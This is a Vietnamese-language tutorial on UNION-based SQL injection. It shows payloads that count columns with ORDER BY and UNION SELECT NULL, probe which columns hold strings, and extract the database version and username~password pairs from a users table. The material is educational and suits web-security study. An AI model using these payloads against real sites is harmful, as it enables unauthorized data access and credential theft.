# ***UNION CƠ BẢN VỚI SQL INJECTION***

## I. UNION được sử dụng như thế nào?
- Mệnh đề **UNION** trong SQL được dùng để gộp kết quả của hai hay nhiều câu lệnh **"SELECT"** thành một thể kết quả duy nhất.
- Mệnh đề **"UNION"** sẽ loại bỏ các hàng trùng lặp (UNION ALL thì sẽ giữ lại toàn bộ, kể cả hàng trùng lặp).

- ***Lưu ý*** để dùng mệnh đề UNION chúng cần phải:
    1. Các câu lệnh truy vấn phải trả về **cùng một số lượng cột.**
    2. Kiểu dữ liệu của các cột **phải tương thích với nhau theo đúng thứ tự**. 

- Ví dụ:

```SQL
SELECT a, b FROM TABLE_1 UNION SELECT c, d FROM TABLE_2;
```

## II. Cách xác định số lượng cột và kiểu dữ liệu trong bảng

### Để thực hiện thành công kỹ thuật này, ta thực hiện qua 3 bước sau:

### 1. Xác định số lượng cột truy vấn ban đầu.
- Có 2 phương pháp phổ biến:
    - **Phương pháp 1.** Sử dụng **ORDER BY**. Ta yêu cầu database sắp xếp kết quả theo cột thứ **n**. Nếu **n** vượt quá số lượng cột thực tế, database sẽ trả về lỗi (VD: The ORDER BY position number 3 is out of range).
    - **Cách làm**: tăng dần chỉ số cho đến khi gặp lỗi.

    ``` SQL
    ' ORDER BY 1 --
    ' ORDER BY 2 --
    ' ORDER BY 3 -- (Nếu ứng dụng mất nội dung/lỗi có thể hiểu rẳng bảng có 2 cột)
    ```

    - **Phương pháp 2.** Sử dụng **UNION SELECT NULL**. Ta dùng **NULL** vì nó có thể ép thành bất kỳ kiểu dữ liệu nào, giúp tránh lỗi không tương thích kiểu dữ liệu trong lúc đang đếm cột.
    - **Cách làm**: thêm dần **NULL** cho đến khi truy vấn trả kết quả về bình thường (không lỗi).

    ``` SQl
    ' UNION SELECT NULL --
    ' UNION SELECT NULL, NULL --
    ' UNION SELECT NULL, NULL, NULL -- (Nếu truy vấn thành công -> Bảng có 3 cột)
    ```

### 2. Xác định cột chứa kiểu dữ liệu chuỗi (String).
- Sau khi đã biết số lượng cột (ví dụ là 3), ta cần xem xét cột nào trong 3 cột đấy chứa dữ liệu dạng văn bản.
- Ta sẽ thay thế tuần tự từng vị trí **NULL** bằng **'a'** (hoặc chuỗi khác). Nếu ứng dụng trả về lỗi thì ta sẽ ghi lại vào vị trí đấy là **NULL và điền vào vị trí tiếp theo. Lặp đi, lặp lại cho đến khi ứng dụng trả kết quả bình thường.**

``` SQL
' UNION SELECT 'a', NULL, NULL -- (Báo lỗi -> Cột 1 không phải string)
' UNION SELECT NULL, 'a', NULL -- (Không lỗi, hiển thị 'a' -> Cột 2 là string)
' UNION SELECT NULL, NULL, 'a' --
```

### 3. Trích xuất dữ liệu mục tiêu

- Khi đã biết kiểu dữ liệu của cột thông qua bước 2. Ta có thể thực hiện các truy vấn để lấy dữ liệu mục tiêu.

- Ví dụ truy xuất phiên bản:

``` SQL
' UNION SELECT NULL, @@version, NULL -- 

> Câu lệnh in ra phiên bản của MySQL, MSSQL mà mục tiêu đang sử dụng.
```
- Ví dụ ghép nối chuỗi (bảng ```users```):

``` SQL
' UNION SELECT NULL, username || '~' || password, NULL FROM users --

> Câu lệnh in ra |tên người dùng~mật khẩu|
```
> Ký hiệu **||** là toán tử nối chuỗi trong Oracle/PostgreSQL, giúp gộp username và password vào cùng 1 cột để hiển thị. Nếu dùng MySQL, ta dùng hàm ***CONCAT()***.